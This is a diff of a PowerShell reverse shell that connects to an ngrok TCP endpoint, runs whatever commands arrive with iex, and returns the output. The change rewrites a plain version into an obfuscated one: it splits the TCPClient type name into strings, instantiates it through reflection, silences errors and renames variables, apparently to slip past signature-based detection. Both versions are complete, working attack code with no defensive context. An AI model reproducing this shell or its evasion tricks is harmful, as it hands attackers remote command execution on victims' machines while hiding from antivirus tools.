@@ -1,12 +1,17 @@
-$client = New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io',12693);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
-$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-$sendback = (iex $data 2>&1 | Out-String );
-$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$stream.Write($sendbyte,0,$sendbyte.Length);
-$stream.Flush()
-};
-$client.Close()
+$h = '0.tcp.ap.ngrok.io'
+$p = 12693
+$ErrorActionPreference = 'SilentlyContinue'
+$k1 = 'System.Net.Soc'
+$k2 = 'kets.TCPClient'
+$c = [Activator]::CreateInstance([Type]::GetType($k1+$k2), $h, $p)
+$s = $c.GetStream()
+$b = New-Object byte[] 65535
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object Text.ASCIIEncoding).GetString($b,0, $i)
+    $sb = (iex $d 2>&1 | Out-String )
+    $pr = 'PS ' + (pwd).Path + '> '
+    $sbt = ([text.encoding]::ASCII).GetBytes($sb + $pr)
+    $s.Write($sbt,0,$sbt.Length)
+    $s.Flush()
+}
+$c.Close()
